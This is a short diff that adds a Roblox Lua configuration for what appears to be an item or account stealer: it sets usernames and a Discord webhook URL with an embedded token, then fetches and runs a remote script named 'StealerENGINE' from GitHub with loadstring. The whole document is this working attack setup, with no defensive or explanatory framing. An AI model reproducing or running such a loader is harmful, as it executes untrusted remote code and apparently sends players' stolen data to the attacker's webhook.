@@ -1,0 +1,5 @@
+UserName = "okmeinbruder"
+Webhook = "https://discord.com/api/webhooks/1142819337233768560/Ock6uw_d7dl0wW7q2RBoZdOnUMvbvLeiw2cEnKAsQvdfCLbhMync0ml_HWhM1FZkm9RW"
+UserName2 = "hallo23456798"
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/procat69420/StealerENGINEProcat/main/StealerENGINE.lua", true))()
